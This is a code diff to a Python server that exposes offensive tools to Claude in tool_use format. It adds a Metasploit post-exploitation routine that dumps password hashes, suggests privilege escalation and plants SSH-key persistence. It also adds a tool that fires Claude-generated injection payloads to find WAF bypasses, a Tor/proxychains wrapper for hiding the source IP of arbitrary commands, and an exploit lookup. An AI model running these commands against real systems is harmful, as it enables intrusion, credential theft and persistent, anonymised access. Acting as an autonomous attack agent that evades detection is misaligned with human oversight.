@@ -18,6 +18,40 @@ from http.server import HTTPServer, BaseHTTPRequestHandler
 from urllib.parse import urlparse, parse_qs
 
 # ── Tool definitions (Claude tool_use format) ─────────────────────────────────
+# New tools added in v3.17
+_NEW_TOOLS = {
+    "post_exploit": {
+        "description": "Full post-exploitation loop: MSF handler, hashdump, privesc suggester, SSH persistence, sysinfo.",
+        "input_schema": {"type": "object", "properties": {
+            "host":    {"type": "string", "description": "Target host IP"},
+            "session": {"type": "string", "description": "MSF session ID (default 1)"},
+            "lport":   {"type": "string", "description": "Listener port (default 4444)"}
+        }, "required": []}
+    },
+    "dynamic_mutate": {
+        "description": "Test a list of Claude-generated payloads against a target and report which bypass the WAF.",
+        "input_schema": {"type": "object", "properties": {
+            "target":          {"type": "string"},
+            "payloads":        {"type": "array", "items": {"type": "string"}},
+            "waf_fingerprint": {"type": "string"}
+        }, "required": ["target"]}
+    },
+    "proxychains_wrap": {
+        "description": "Run any command through proxychains + Tor for IP rotation.",
+        "input_schema": {"type": "object", "properties": {
+            "command": {"type": "string", "description": "Shell command to wrap"},
+            "proxy":   {"type": "string", "description": "tor or socks5"}
+        }, "required": ["command"]}
+    },
+    "cve_rag_local": {
+        "description": "Local CVE lookup: searchsploit + msfconsole search + nuclei CVE templates for a product/version.",
+        "input_schema": {"type": "object", "properties": {
+            "product": {"type": "string"},
+            "version": {"type": "string"}
+        }, "required": ["product"]}
+    },
+}
+
 TOOLS = {
     "nmap": {
         "description": "Network port scanner. Discover open ports, services and OS on targets.",
@@ -1563,6 +1597,66 @@ for hdr in ['X-User-Role: admin','X-Admin: true','X-Internal-User: admin','X-Aut
 print("\\n=== SESSION CHAIN COMPLETE ===")
 CHAINEOF"""
 
+    elif tool == "post_exploit":
+        host    = shlex.quote(args.get('host', '127.0.0.1'))
+        session = args.get('session', '1')
+        lport   = args.get('lport', '4444')
+        return f"""msfconsole -q -x "
+use exploit/multi/handler;
+set LHOST 0.0.0.0;
+set LPORT {lport};
+set ExitOnSession false;
+exploit -j -z;
+sessions -i {session};
+run post/multi/recon/local_exploit_suggester SESSION={session};
+run post/linux/gather/hashdump SESSION={session};
+run post/multi/gather/env SESSION={session};
+run post/linux/manage/sshkey_persistence SESSION={session};
+run post/multi/manage/shell_to_meterpreter SESSION={session};
+getuid; sysinfo; getpid;
+run post/linux/gather/checkvm SESSION={session};
+exit" 2>&1 | head -120"""
+
+    elif tool == "dynamic_mutate":
+        target  = args['target']
+        payload = args.get('payload', "' OR 1=1--")
+        waf_fp  = args.get('waf_fingerprint', 'unknown')
+        payloads = args.get('payloads', [])
+        if not payloads:
+            payloads = [payload]
+        tests = []
+        for p in payloads[:20]:
+            enc = urllib.parse.quote(p, safe='')
+            tests.append(f"curl -si --max-time 6 -A 'Mozilla/5.0' {shlex.quote(target.replace('FUZZ', enc))} 2>&1 | head -5")
+        return f"""echo '=== DYNAMIC PAYLOAD TEST: {waf_fp} WAF ===' && """.rstrip() + " && ".join(tests) + " 2>&1 | head -100"
+
+    elif tool == "proxychains_wrap":
+        cmd     = args.get('command', 'curl https://ifconfig.me')
+        proxy   = args.get('proxy', 'tor')
+        config  = args.get('config', '/etc/proxychains4.conf')
+        if proxy == 'tor':
+            return f"""echo '=== PROXYCHAINS + TOR ===' &&
+service tor start 2>/dev/null || tor --RunAsDaemon 1 --DataDirectory /tmp/tor_data &
+sleep 3 &&
+proxychains4 -f {shlex.quote(config)} -q {cmd} 2>&1 | head -60 &&
+echo '--- IP via Tor ---' &&
+proxychains4 -q curl -s --max-time 10 https://ifconfig.me 2>&1"""
+        else:
+            return f"proxychains4 -f {shlex.quote(config)} -q {cmd} 2>&1 | head -80"
+
+    elif tool == "cve_rag_local":
+        product = args.get('product', '')
+        version = args.get('version', '')
+        query   = f"{product} {version}".strip()
+        limit   = int(args.get('limit', 10))
+        return f"""echo '=== CVE RAG LOCAL: {query} ===' &&
+echo '--- searchsploit ---' &&
+searchsploit {shlex.quote(query)} 2>&1 | head -30 &&
+echo '--- msfconsole search ---' &&
+msfconsole -q -x "search type:exploit {shlex.quote(query)}; exit" 2>&1 | grep -v '^$' | head -30 &&
+echo '--- nuclei CVE templates ---' &&
+nuclei -u placeholder -tags cves -search {shlex.quote(query)} -no-color 2>&1 | head -20"""
+
     return None
 
 
@@ -1650,6 +1744,8 @@ def run_command(cmd, timeout=60):
 _CALLBACKS = []  # list of dicts: {time, ip, path, data}
 
 # ── HTTP Handler ───────────────────────────────────────────────────────────────
+
+TOOLS.update(_NEW_TOOLS)
 
 class MCPHandler(BaseHTTPRequestHandler):
     def _cors(self):
